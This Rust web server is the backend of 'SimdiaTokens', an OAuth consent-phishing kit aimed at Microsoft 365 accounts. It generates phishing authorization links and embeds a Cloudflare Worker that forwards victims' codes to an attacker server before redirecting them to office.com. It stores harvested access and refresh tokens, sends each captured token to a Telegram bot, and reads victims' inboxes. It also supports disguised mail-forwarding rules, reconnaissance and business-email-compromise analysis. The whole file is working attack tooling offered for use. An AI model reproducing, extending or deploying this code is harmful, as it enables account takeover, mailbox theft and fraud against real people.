use actix_web::{web, App, HttpServer, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use sqlx::{SqlitePool, sqlite::SqlitePoolOptions};
use chrono::{Utc, Duration};
use uuid::Uuid;
use std::env;
use dotenv::dotenv;
use reqwest::Client;
use rand::Rng;
use actix_cors::Cors;

mod vault;
use vault::Vault;

mod scheduler;
use scheduler::start_scheduler;

mod graph_client;
pub use graph_client::GraphClient;

mod recon;
use recon::{recon_get_handler, recon_run_handler};

mod rules;
use rules::{create_rule_handler, list_rules_handler};

mod ai_analysis;
use ai_analysis::{ai_analyses_handler, ai_analyze_handler};

mod stealth;
use stealth::stealth_config_handler;

mod campaigns;
use campaigns::{
    attach_token_handler, create_campaign_handler, delete_campaign_handler,
    get_campaign_handler, list_campaigns_handler,
};

mod response_crypto;
use response_crypto::ResponseCrypto;

mod audit;
use audit::{analytics_overview_handler, audit_logs_handler, audit_summary_handler, AuditMiddleware};

mod settings;
use settings::{get_ai_settings_handler, save_ai_settings_handler, test_decrypt_handler, purge_expired_handler};

mod auth;
use auth::{register_handler, login_handler, me_handler, ensure_users_table, seed_default_admin};

mod bec;
use bec::bec_analyze_handler;

mod inbox_folders;
use inbox_folders::{list_folders_handler, folder_messages_handler, create_folder_handler, send_mail_handler, delete_message_handler};

// ------------------- CONFIGURATION -------------------
#[derive(Debug, Clone)]
pub struct AppConfig {
    client_id: String,
    client_secret: String,
    redirect_uri: String,
    first_party_ids: Vec<String>,
    database_url: String,
    telegram_bot_token: Option<String>,
    telegram_chat_id: Option<String>,
    master_secret: String,
    frontend_url: Option<String>,
}

impl AppConfig {
    fn from_env() -> Self {
        Self {
            client_id: env::var("CLIENT_ID").expect("CLIENT_ID not set"),
            client_secret: env::var("CLIENT_SECRET").expect("CLIENT_SECRET not set"),
            redirect_uri: env::var("REDIRECT_URI").expect("REDIRECT_URI not set"),
            first_party_ids: vec![
                "04b07795-8ddb-461a-bbee-02f9e1bf7b46".to_string(),
                "a672d62c-fc7b-4e81-a576-e60dc46e951d".to_string(),
                "d3590ed6-52b3-4102-aeff-aad2292ab01c".to_string(),
            ],
            database_url: env::var("DATABASE_URL").unwrap_or_else(|_| "sqlite::memory:".to_string()),
            telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN").ok(),
            telegram_chat_id: env::var("TELEGRAM_CHAT_ID").ok(),
            master_secret: env::var("MASTER_SECRET").expect("MASTER_SECRET not set"),
            frontend_url: env::var("FRONTEND_URL").ok(),
        }
    }
}

#[derive(Debug, sqlx::FromRow, Serialize)]
struct HarvestedToken {
    id: String,
    email: Option<String>,
    access_token: String,
    refresh_token: String,
    expires_at: chrono::DateTime<Utc>,
    captured_at: chrono::DateTime<Utc>,
    source: String,
}

#[derive(Clone)]
pub struct AppState {
    pool: SqlitePool,
    config: AppConfig,
    http_client: Client,
    vault: Vault,
    response_key: [u8; 32],
}

/// Retrieve token from vault (tokens table) or fall back to harvested table.
pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Result<vault::DecryptedToken> {
    // First try vault (encrypted tokens table)
    if let Ok(token) = state.vault.retrieve_token(&state.pool, token_id).await {
        return Ok(token);
    }
    // Fall back to harvested table (legacy plain-text storage)
    let row: HarvestedToken = sqlx::query_as(
        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?"
    )
    .bind(token_id)
    .fetch_one(&state.pool)
    .await
    .map_err(|e| anyhow::anyhow!("Token not found in any storage: {}", e))?;

    Ok(vault::DecryptedToken {
        id: row.id,
        campaign_id: "harvested".to_string(),
        user_email: row.email.unwrap_or_default(),
        access_token: row.access_token,
        refresh_token: row.refresh_token,
        scopes: vec![],
        expires_at: row.expires_at,
        created_at: row.captured_at,
        last_refreshed_at: None,
    })
}

fn generate_id() -> String {
    Uuid::new_v4().to_string()
}

#[derive(Deserialize)]
struct StoreTokenRequest {
    campaign_id: String,
    user_email: String,
    access_token: String,
    refresh_token: String,
    scopes: Vec<String>,
    expires_at: chrono::DateTime<Utc>,
}

async fn store_token_handler(
    body: web::Json<StoreTokenRequest>,
    audit_ctx: audit::AuditContext,
    state: web::Data<AppState>,
) -> impl Responder {
    let result = state.vault.store_token(
        &state.pool,
        &body.campaign_id,
        &body.user_email,
        &body.access_token,
        &body.refresh_token,
        body.scopes.clone(),
        body.expires_at,
    ).await;

    let success = result.is_ok();
    let token_id = result.as_ref().ok().cloned();

    let _ = audit::insert_audit_log(
        &state.pool,
        "token_stored",
        Some(&body.campaign_id),
        token_id.as_deref(),
        Some(&body.user_email),
        Some(&audit_ctx.ip_address),
        Some(&audit_ctx.user_agent),
        Some(serde_json::json!({"scopes": body.scopes})),
        success,
    ).await;

    match result {
        Ok(id) => {
            println!("Stored encrypted token {} for campaign {}", id, body.campaign_id);
            HttpResponse::Ok().json(serde_json::json!({
                "status": "stored",
                "id": id
            }))
        }
        Err(e) => {
            eprintln!("Token store error: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_store_token",
                "details": format!("{}", e)
            }))
        }
    }
}

async fn send_telegram_notification(config: &AppConfig, refresh_token: &str, email: &str) {
    if let (Some(token), Some(chat_id)) = (&config.telegram_bot_token, &config.telegram_chat_id) {
        let message = format!("🎯 *New Token Captured!*\n\nEmail: `{}`\nRefresh Token: `{}`\nTime: {}", email, refresh_token, Utc::now());
        let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
        let params = [
            ("chat_id", chat_id.as_str()),
            ("text", message.as_str()),
            ("parse_mode", "Markdown"),
        ];
        let _ = reqwest::Client::new()
            .post(&url)
            .form(&params)
            .send()
            .await;
    }
}

async fn fetch_user_email(access_token: &str) -> Option<String> {
    let client = Client::new();
    let resp = client
        .get("https://graph.microsoft.com/v1.0/me")
        .header("Authorization", format!("Bearer {}", access_token))
        .send()
        .await
        .ok()?;
    let body: serde_json::Value = resp.json().await.ok()?;
    body.get("userPrincipalName")?.as_str().map(|s| s.to_string())
}

#[derive(Deserialize)]
struct ExchangeQuery {
    code: String,
}

async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppState>) -> impl Responder {
    let code = &query.code;
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "authorization_code"),
        ("code", code.as_str()),
        ("redirect_uri", state.config.redirect_uri.as_str()),
    ];
    let client = &state.http_client;
    let res = client.post(token_url).form(&params).send().await;
    match res {
        Ok(resp) => {
            let body: serde_json::Value = resp.json().await.unwrap_or_default();
            if let (Some(access_token), Some(refresh_token)) = (body.get("access_token").and_then(|v| v.as_str()), body.get("refresh_token").and_then(|v| v.as_str())) {
                let id = generate_id();
                let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
                let _expires_at = Utc::now() + Duration::seconds(expires_in);
                // Set refresh token expiry to 90 days for Microsoft confidential clients
                let refresh_expires_at = Utc::now() + Duration::days(90);
                let email = fetch_user_email(access_token).await;
                let email_str = email.clone().unwrap_or_else(|| "unknown".to_string());
                println!("Attempting to insert token for email: {:?}", email);
                // Store in harvested table (legacy, for dashboard display)
                sqlx::query(
                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source) VALUES (?, ?, ?, ?, ?, ?, ?)"
                )
                .bind(&id)
                .bind(&email)
                .bind(access_token)
                .bind(refresh_token)
                .bind(refresh_expires_at)
                .bind(Utc::now())
                .bind("oauth_app")
                .execute(&state.pool)
                .await
                .ok();
                // Also store in encrypted tokens table (for scheduler refresh, BEC, recon, etc.)
                let _ = state.vault.store_token(
                    &state.pool,
                    &id,
                    &email_str,
                    access_token,
                    refresh_token,
                    vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.Read".to_string()],
                    refresh_expires_at,
                ).await;
                if let Some(email) = email {
                    send_telegram_notification(&state.config, refresh_token, &email).await;
                }
                HttpResponse::Ok().json(serde_json::json!({"status": "token_stored"}))
            } else {
                HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
            }
        }
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("request_failed: {}", e)}))
    }
}

// JSON API: list all tokens
async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested ORDER BY captured_at DESC")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    HttpResponse::Ok().json(rows)
}

// JSON API: get single encrypted token by id
async fn api_token_by_id(
    path: web::Path<String>,
    req: actix_web::HttpRequest,
    state: web::Data<AppState>,
) -> impl Responder {
    let id = path.into_inner();
    match state.vault.retrieve_token(&state.pool, &id).await {
        Ok(token) => {
            let json = serde_json::to_value(token).unwrap_or_default();
            ResponseCrypto::respond(&req, json, &state.response_key)
        }
        Err(_) => HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    }
}

#[derive(Deserialize)]
struct DeleteTokensRequest {
    token_ids: Vec<String>,
}

// JSON API: batch delete tokens
async fn api_delete_tokens(
    body: web::Json<DeleteTokensRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let mut deleted_harvested = 0u64;
    let mut deleted_vault = 0u64;

    for id in &body.token_ids {
        let r1 = sqlx::query("DELETE FROM harvested WHERE id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        if let Ok(r) = r1 {
            deleted_harvested += r.rows_affected();
        }

        let r2 = sqlx::query("DELETE FROM tokens WHERE id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        if let Ok(r) = r2 {
            deleted_vault += r.rows_affected();
        }
    }

    HttpResponse::Ok().json(serde_json::json!({
        "success": true,
        "deleted": deleted_harvested + deleted_vault,
        "deleted_harvested": deleted_harvested,
        "deleted_vault": deleted_vault,
    }))
}

#[derive(Serialize)]
struct TokenHealthResponse {
    active: i64,
    expired: i64,
    revoked: i64,
    total: i64,
}

// JSON API: token health counts
async fn tokens_health(state: web::Data<AppState>) -> impl Responder {
    let now = Utc::now();

    let active: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE expires_at > ? AND (status IS NULL OR status != 'revoked')"
    )
    .bind(now)
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let expired: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE expires_at <= ? AND (status IS NULL OR status != 'revoked')"
    )
    .bind(now)
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let revoked: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE status = 'revoked'"
    )
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let total = active + expired + revoked;

    HttpResponse::Ok().json(TokenHealthResponse { active, expired, revoked, total })
}

// JSON API: get inbox emails for a token
#[derive(Deserialize)]
pub struct InboxApiQuery {
    token_id: String,
}

async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        // Try to refresh the access token
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = match fresh_access {
            Some(t) => t,
            None => {
                // Fall back to stored access token, but it may be expired
                println!("Failed to refresh token for {}", token.id);
                token.access_token.clone()
            }
        };
        
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        
        match resp {
            Ok(r) => {
                if r.status() == 401 {
                    // Unauthorized – token invalid
                    return HttpResponse::Unauthorized().json(serde_json::json!({
                        "error": "Access token expired and refresh failed. The refresh token may be revoked or expired."
                    }));
                }
                let body: serde_json::Value = r.json().await.unwrap_or_default();
                HttpResponse::Ok().json(body)
            }
            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({
                "error": format!("Request failed: {}", e)
            }))
        }
    } else {
        HttpResponse::NotFound().json(serde_json::json!({"error": "Token not found"}))
    }
}

// Generate a random OAuth link with random worker subdomain
#[derive(Serialize)]
struct GenerateOAuthLinkResponse {
    link: String,
    worker_subdomain: String,
}

async fn generate_oauth_link(state: web::Data<AppState>) -> impl Responder {
    let subdomain: String = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(12)
        .map(char::from)
        .collect::<String>()
        .to_lowercase();

    let worker_url = format!("https://{}-simdiatokens-oauth.lubaking-co.workers.dev", subdomain);
    let redirect_uri = format!("{}/oauth/callback", worker_url);

    let scopes = "openid%20offline_access%20User.Read%20Mail.Read";
    let state_param: String = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    let link = format!(
        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={}&response_type=code&redirect_uri={}&scope={}&state={}&response_mode=query",
        state.config.client_id,
        redirect_uri,
        scopes,
        state_param
    );

    HttpResponse::Ok().json(GenerateOAuthLinkResponse {
        link,
        worker_subdomain: subdomain,
    })
}

// Embedded worker script for deployment
const WORKER_SCRIPT: &str = r#"// SimdiaTokens OAuth Worker
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const _MAIN_SERVER = typeof MAIN_SERVER !== 'undefined' ? MAIN_SERVER : 'https://simdiatokens-server-production.up.railway.app';
  const _CLIENT_ID = typeof CLIENT_ID !== 'undefined' ? CLIENT_ID : '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
  const _REDIRECT_URI = typeof REDIRECT_URI !== 'undefined' ? REDIRECT_URI : 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
  const SCOPE = 'openid offline_access User.Read Mail.Read Files.ReadWrite.All';

  if (url.pathname === '/start') {
    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(_REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}`;
    return Response.redirect(authUrl, 302);
  }

  if (url.pathname === '/oauth/callback') {
    const code = url.searchParams.get('code');
    if (!code) return new Response('Missing authorization code', { status: 400 });
    const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}`;
    try { await fetch(exchangeUrl, { method: 'GET' }); } catch (err) { console.error(err); }
    return Response.redirect('https://www.office.com', 302);
  }

  if (url.pathname === '/status') {
    return new Response(JSON.stringify({ status: 'ok', worker: 'simdiatokens-oauth-worker', main_server: _MAIN_SERVER, redirect_uri: _REDIRECT_URI }), { headers: { 'Content-Type': 'application/json' } });
  }

  return new Response('Not Found', { status: 404 });
}
"#;

#[derive(Serialize)]
struct DeployWorkerResponse {
    success: bool,
    worker_url: String,
    message: String,
}

// Deploy worker to Cloudflare using their REST API
async fn deploy_worker(state: web::Data<AppState>) -> impl Responder {
    let cf_account_id = match env::var("CF_ACCOUNT_ID") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({
            "success": false,
            "message": "CF_ACCOUNT_ID env var not set"
        })),
    };
    let cf_api_token = match env::var("CF_API_TOKEN") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({
            "success": false,
            "message": "CF_API_TOKEN env var not set"
        })),
    };

    let script_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
    let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());

    let main_server = format!("https://{}", env::var("RAILWAY_PUBLIC_DOMAIN")
        .or_else(|_| env::var("RAILWAY_STATIC_URL"))
        .unwrap_or_else(|_| "simdiatokens-v2-production.up.railway.app".to_string()));

    let redirect_uri = format!("https://{}.{}/oauth/callback", script_name, workers_subdomain);

    // Build metadata with text bindings
    // body_part tells Cloudflare which multipart part contains the script
    let metadata = serde_json::json!({
        "body_part": "script",
        "bindings": [
            { "type": "plain_text", "name": "MAIN_SERVER", "text": main_server },
            { "type": "plain_text", "name": "CLIENT_ID", "text": state.config.client_id },
            { "type": "plain_text", "name": "REDIRECT_URI", "text": redirect_uri }
        ]
    });

    let url = format!(
        "https://api.cloudflare.com/client/v4/accounts/{}/workers/scripts/{}",
        cf_account_id, script_name
    );

    let form = reqwest::multipart::Form::new()
        .part("metadata", reqwest::multipart::Part::text(metadata.to_string())
            .mime_str("application/json").unwrap())
        .part("script", reqwest::multipart::Part::text(WORKER_SCRIPT.to_string())
            .file_name("index.js")
            .mime_str("application/javascript").unwrap());

    println!("[deploy] Uploading worker to {}", url);
    println!("[deploy] Redirect URI: {}", redirect_uri);

    let res = match state.http_client
        .put(&url)
        .header("Authorization", format!("Bearer {}", cf_api_token))
        .multipart(form)
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[deploy] Cloudflare API request failed: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({
                "success": false,
                "message": format!("Cloudflare API request failed: {}", e)
            }));
        }
    };

    let status = res.status();
    let body_text = res.text().await.unwrap_or_default();

    println!("[deploy] Cloudflare response {}: {}", status, body_text);

    if status.is_success() {
        let worker_url = format!("https://{}.{}", script_name, workers_subdomain);
        HttpResponse::Ok().json(DeployWorkerResponse {
            success: true,
            worker_url,
            message: "Worker deployed successfully".to_string(),
        })
    } else {
        HttpResponse::InternalServerError().json(serde_json::json!({
            "success": false,
            "message": format!("Cloudflare API returned {}: {}", status, body_text)
        }))
    }
}

// Helper: refresh access token
async fn refresh_access_token(state: &AppState, refresh_token: &str) -> Option<String> {
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "refresh_token"),
        ("refresh_token", refresh_token),
    ];
    let res = state.http_client.post(token_url).form(&params).send().await.ok()?;
    let body: serde_json::Value = res.json().await.ok()?;
    body.get("access_token").and_then(|v| v.as_str()).map(|s| s.to_string())
}


// Root status route
async fn root_status() -> impl Responder {
    HttpResponse::Ok().json(serde_json::json!({
        "name": "SimdiaTokens API",
        "version": "2.0.0",
        "status": "operational",
        "endpoints": {
            "auth": "/api/auth/login, /api/auth/register, /api/auth/me",
            "tokens": "/api/tokens, /api/tokens/health",
            "campaigns": "/api/campaigns",
            "inbox": "/api/inbox",
            "recon": "/api/recon/run, /api/recon/{id}",
            "ai": "/api/ai/analyses, /api/ai/analyze",
            "analytics": "/api/analytics/overview",
            "settings": "/api/settings/ai",
            "exchange": "/exchange?code=..."
        }
    }))
}

// HTML admin dashboard (with View Inbox button)
async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested ORDER BY captured_at DESC")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>
        body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}
        table{width:100%;border-collapse:collapse;}
        th,td{padding:10px;border-bottom:1px solid #333;}
        .token{font-family:monospace;font-size:12px;}
        button{background:#0078d4;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}
        button:hover{background:#005a9e;}
        a{text-decoration:none;}
    </style></head><body><h1>SimdiaTokens Harvested Tokens</h1>
    <table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th><th>Actions</th></tr>"#);
    for token in rows {
        let email = token.email.as_deref().unwrap_or("unknown");
        let refresh_short = if token.refresh_token.len() > 20 { format!("{}...", &token.refresh_token[..20]) } else { token.refresh_token.clone() };
        html.push_str(&format!(
            r#"<tr><td>{}</td><td>{}</td><td class='token'>{}</td><td>{}</td><td>{}</td>
            <td><a href='/inbox_view?token_id={}'><button>View Inbox</button></a></td></tr>"#,
            token.id, email, refresh_short, token.expires_at, token.source, token.id
        ));
    }
    html.push_str("</table></body></html>");
    HttpResponse::Ok().content_type("text/html").body(html)
}

// HTML inbox view (fallback)
async fn inbox_view_html(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = fresh_access.unwrap_or(token.access_token);
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        match resp {
            Ok(r) => {
                let data: serde_json::Value = r.json().await.unwrap_or_default();
                let mut html = String::from(r#"<!DOCTYPE html><html><head><title>Inbox</title><style>body{font-family:Arial;background:#f0f2f5;margin:0;padding:20px;}h2{color:#333;}.email{background:white;margin-bottom:10px;padding:15px;border-radius:8px;}</style></head><body><h1>Inbox</h1>"#);
                if let Some(msgs) = data.get("value").and_then(|v| v.as_array()) {
                    for msg in msgs {
                        let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("(no subject)");
                        let from = msg.get("from").and_then(|v| v.get("emailAddress")).and_then(|v| v.get("address")).and_then(|v| v.as_str()).unwrap_or("unknown");
                        let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
                        let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("");
                        html.push_str(&format!("<div class='email'><b>{}</b><br>From: {}<br>{}<br>{}</div><hr>", subject, from, received, body_preview));
                    }
                } else {
                    html.push_str("<p>No emails found</p>");
                }
                html.push_str("</body></html>");
                HttpResponse::Ok().content_type("text/html").body(html)
            }
            Err(e) => HttpResponse::InternalServerError().body(format!("Error: {}", e))
        }
    } else {
        HttpResponse::NotFound().body("Token not found")
    }
}

async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
    sqlx::query(
        "CREATE TABLE IF NOT EXISTS harvested (
            id TEXT PRIMARY KEY,
            email TEXT,
            access_token TEXT NOT NULL,
            refresh_token TEXT NOT NULL,
            expires_at DATETIME NOT NULL,
            captured_at DATETIME NOT NULL,
            source TEXT NOT NULL
        )"
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS tokens (
            id TEXT PRIMARY KEY,
            campaign_id TEXT,
            user_email TEXT,
            encrypted_access_token BLOB NOT NULL,
            encrypted_refresh_token BLOB NOT NULL,
            access_salt BLOB NOT NULL,
            refresh_salt BLOB NOT NULL,
            scopes TEXT,
            expires_at DATETIME NOT NULL,
            created_at DATETIME NOT NULL,
            last_refreshed_at DATETIME,
            status TEXT DEFAULT 'active'
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS recon_reports (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            report_json TEXT NOT NULL,
            created_at DATETIME NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS created_rules (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            graph_rule_id TEXT,
            display_name TEXT NOT NULL,
            disguise_name TEXT NOT NULL,
            conditions_json TEXT NOT NULL,
            actions_json TEXT NOT NULL,
            target_folder TEXT,
            forward_to TEXT,
            created_at DATETIME NOT NULL,
            status TEXT NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS ai_analyses (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            analysis_json TEXT NOT NULL,
            created_at DATETIME NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS campaigns (
            id TEXT PRIMARY KEY,
            name TEXT NOT NULL,
            client_id TEXT NOT NULL,
            requested_scopes TEXT,
            device_code TEXT,
            user_code TEXT,
            verification_uri TEXT,
            status TEXT NOT NULL,
            created_at DATETIME NOT NULL,
            expires_at DATETIME NOT NULL,
            token_id TEXT
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS audit_logs (
            id TEXT PRIMARY KEY,
            timestamp DATETIME NOT NULL,
            action TEXT NOT NULL,
            campaign_id TEXT,
            token_id TEXT,
            user_email TEXT,
            ip_address TEXT,
            user_agent TEXT,
            details TEXT,
            success BOOLEAN NOT NULL
        )
        "#
    ).execute(pool).await?;

    Ok(())
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    dotenv().ok();
    let config = AppConfig::from_env();

    let db_path = config.database_url
        .strip_prefix("sqlite:///")
        .or_else(|| config.database_url.strip_prefix("sqlite://"))
        .or_else(|| config.database_url.strip_prefix("sqlite:"))
        .unwrap_or(&config.database_url)
        .to_string();

    if db_path != ":memory:" {
        // Ensure parent directory exists
        if let Some(parent) = std::path::Path::new(&db_path).parent() {
            if !parent.as_os_str().is_empty() {
                std::fs::create_dir_all(parent)
                    .expect("Failed to create database directory");
            }
        }

        // Test that we can actually write to the directory
        let test_file = std::path::Path::new(&db_path)
            .parent()
            .unwrap_or(std::path::Path::new("."))
            .join(".write_test");
        match std::fs::write(&test_file, b"test") {
            Ok(_) => {
                std::fs::remove_file(&test_file).ok();
                println!("Write test passed on directory");
            }
            Err(e) => {
                panic!("Directory is NOT writable: {}. Check Railway volume permissions.", e);
            }
        }
    }

    // Use ?mode=rwc to force SQLite to create the file if it doesn't exist
    let connect_url = if db_path == ":memory:" {
        config.database_url.clone()
    } else {
        format!("sqlite:///{}?mode=rwc", db_path)
    };

    println!("Connecting to: {}", connect_url);

    let pool = SqlitePoolOptions::new()
        .max_connections(5)
        .connect(&connect_url)
        .await
        .expect("Failed to create database pool");

    init_db(&pool).await.expect("Failed to init DB");
    ensure_users_table(&pool).await.expect("Failed to init users table");
    seed_default_admin(&pool).await.expect("Failed to seed admin");
    let http_client = Client::new();
    let vault = Vault::new(config.master_secret.clone());
    let response_key = ResponseCrypto::derive_key(&config.master_secret);
    let app_state = web::Data::new(AppState { pool, config, http_client, vault, response_key });

    let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let port = port.parse::<u16>().unwrap_or(8080);

    println!("SimdiaTokens backend running on http://0.0.0.0:{}", port);
    start_scheduler(app_state.clone());
    HttpServer::new(move || {
        let cors = if let Some(ref frontend) = app_state.config.frontend_url {
            Cors::default()
                .allowed_origin(frontend)
                .allowed_origin("http://localhost:3000")
                .allow_any_method()
                .allow_any_header()
                .expose_headers(vec!["Authorization"])
                .supports_credentials()
        } else {
            Cors::default()
                .allow_any_origin()
                .allow_any_method()
                .allow_any_header()
                .expose_headers(vec!["Authorization"])
                .supports_credentials()
        };
        App::new()
            .wrap(cors)
            .wrap(AuditMiddleware)
            .app_data(app_state.clone())
            .route("/", web::get().to(root_status))
            .route("/exchange", web::get().to(exchange_code))
            .route("/admin", web::get().to(admin_dashboard))
            .route("/inbox_view", web::get().to(inbox_view_html))
            .route("/api/tokens", web::get().to(api_tokens))
            .route("/api/tokens", web::delete().to(api_delete_tokens))
            .route("/api/tokens/{id}", web::get().to(api_token_by_id))
            .route("/api/tokens/store", web::post().to(store_token_handler))
            .route("/api/tokens/health", web::get().to(tokens_health))
            .route("/api/inbox", web::get().to(api_inbox))
            .route("/api/recon/run", web::post().to(recon_run_handler))
            .route("/api/recon/{token_id}", web::get().to(recon_get_handler))
            .route("/api/rules", web::get().to(list_rules_handler))
            .route("/api/rules/create", web::post().to(create_rule_handler))
            .route("/api/ai/analyses", web::get().to(ai_analyses_handler))
            .route("/api/ai/analyze", web::post().to(ai_analyze_handler))
            .route("/api/stealth/config", web::get().to(stealth_config_handler))
            .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
            .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
            .route("/api/campaigns", web::get().to(list_campaigns_handler))
            .route("/api/campaigns/create", web::post().to(create_campaign_handler))
            .route("/api/campaigns/{id}", web::get().to(get_campaign_handler))
            .route("/api/campaigns/{id}/attach_token", web::post().to(attach_token_handler))
            .route("/api/campaigns/{id}", web::delete().to(delete_campaign_handler))
            .route("/api/analytics/overview", web::get().to(analytics_overview_handler))
            .route("/api/audit/logs", web::get().to(audit_logs_handler))
            .route("/api/audit/summary", web::get().to(audit_summary_handler))
            .route("/api/settings/ai", web::get().to(get_ai_settings_handler))
            .route("/api/settings/ai", web::post().to(save_ai_settings_handler))
            .route("/api/test-decrypt", web::post().to(test_decrypt_handler))
            .route("/api/maintenance/purge-expired", web::post().to(purge_expired_handler))
            .route("/api/auth/register", web::post().to(register_handler))
            .route("/api/auth/login", web::post().to(login_handler))
            .route("/api/auth/me", web::get().to(me_handler))
            .route("/api/auth/change-password", web::post().to(auth::change_password_handler))
            .route("/api/bec/analyze", web::get().to(bec_analyze_handler))
            .route("/api/inbox/folders", web::get().to(list_folders_handler))
            .route("/api/inbox/folders", web::post().to(create_folder_handler))
            .route("/api/inbox/folders/{folder_id}", web::get().to(folder_messages_handler))
            .route("/api/inbox/send", web::post().to(send_mail_handler))
            .route("/api/inbox/messages/{message_id}", web::delete().to(delete_message_handler))
    })
    .bind(("0.0.0.0", port))?
    .run()
    .await
}